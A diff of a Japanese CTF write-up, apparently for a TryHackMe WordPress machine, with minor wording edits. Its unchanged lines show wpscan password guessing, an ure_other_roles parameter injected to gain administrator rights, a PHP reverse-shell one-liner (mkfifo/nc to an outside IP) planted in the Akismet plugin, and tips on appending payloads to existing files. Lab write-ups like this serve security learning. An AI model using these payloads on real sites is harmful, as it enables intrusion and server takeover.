@@ -152,13 +152,13 @@ WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                 
 Shellcodes: No Results
 ```
 
-wendy のパスワードが判明。
+fasttrack から wendy のパスワードが判明。
 
 ```sh
 $ wpscan --url http://jack.thm/ --passwords /usr/share/wordlists/fasttrack.txt --usernames jack,danny,wendy
 ```
 
-エクスプロイトを実行してみたが失敗。
+エクスプロイトを実行してみたがエラー発生。
 
 ```sh
 msf auxiliary(test/ure) > exploit
@@ -175,13 +175,14 @@ msf auxiliary(test/ure) > exploit
 [*] Auxiliary module execution completed
 ```
 
-プロフィール変更のリクエストをBurpでインターセプトし、ure_other_rolesをセット。
+Metasploitコードを解析してペイロードを用意。  
+プロフィール変更のリクエストをBurpでインターセプトし、ure_other_roles パラメータを追加。
 
 ```http
 ure_other_roles=activate_plugins,delete_others_pages,delete_others_posts,delete_pages,delete_posts,delete_private_pages,delete_private_posts,delete_published_pages,delete_published_posts,edit_dashboard,edit_others_pages,edit_others_posts,edit_pages,edit_posts,edit_private_pages,edit_private_posts,edit_published_pages,edit_published_posts,edit_theme_options,export,import,list_users,manage_categories,manage_links,manage_options,moderate_comments,promote_users,publish_pages,publish_posts,read_private_pages,read_private_posts,read,remove_users,switch_themes,upload_files,customize,delete_site,create_users,delete_plugins,delete_themes,delete_users,edit_plugins,edit_themes,edit_users,install_plugins,install_themes,unfiltered_html,unfiltered_upload,update_core,update_plugins,update_themes,ure_create_capabilities,ure_create_roles,ure_delete_capabilities,ure_delete_roles,ure_edit_roles,ure_manage_options,ure_reset_roles
 ```
 
-ダッシュボードが管理者用になった。
+ダッシュボードが管理者用に変わった。
 
 404テンプレートを更新しようと思ったが、エラーが発生した。コメント部分だけの変更でも発生するので、内容の問題ではないと思われる。
 
@@ -189,7 +190,7 @@ ure_other_roles=activate_plugins,delete_others_pages,delete_others_posts,delete_
 Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.
 ```
 
-jackのパスワードを変更できた。しかし同様に更新はできなかった。
+jackのパスワードを変更できた。しかしjackも同様に更新はできなかった。
 
 plugin の方で、akismet/akismet.php は更新できた。
 
@@ -197,7 +198,7 @@ plugin の方で、akismet/akismet.php は更新できた。
 <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.129.39 8888 >/tmp/f") ?>
 ```
 
-プラグインをActivateしたらリバースシェル取得成功。
+プラグインをActivateしたらリバースシェル取得成功した。
 
 ```sh
 www-data@jack:/var/www/html/wp-admin$ id
@@ -354,7 +355,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ## 振り返り
 
 - seclists の1000行のパスワードでヒットしなかったが、250行程度のfasttrackでヒットした。fasttrackは管理者などが一時的な値として設定しそうな値が入っている。今回はまさにそのパターン。
-- Metasploitモジュールがそのままでは使えず、解析して手作業で実行するというのは、ありそうであまりないパターン。
+- Metasploitモジュールがそのままでは使えず、エラーを解析して手作業で実行するというのは、ありそうであまりないパターン。
 - WordPress はテーマ編集できない場合でも、プラグイン編集ができる場合があると学んだ。
 - プラグイン編集でPentestMonkeyに置き換えたらアクティベート対象として表示されなくなり、リセットが必要になった。WordPress で PHP編集するときは、全体を置き換えるのではなく、既存のPHPの一番上に一行追加する程度が良い。
 - 同様に、os.py を完全に置き換えたら依存関係のため実行時エラーになった。これも既存のPythonファイルの最後に追加する程度が良い。既存の機能をなるべく壊さない配慮はCTFでも重要。
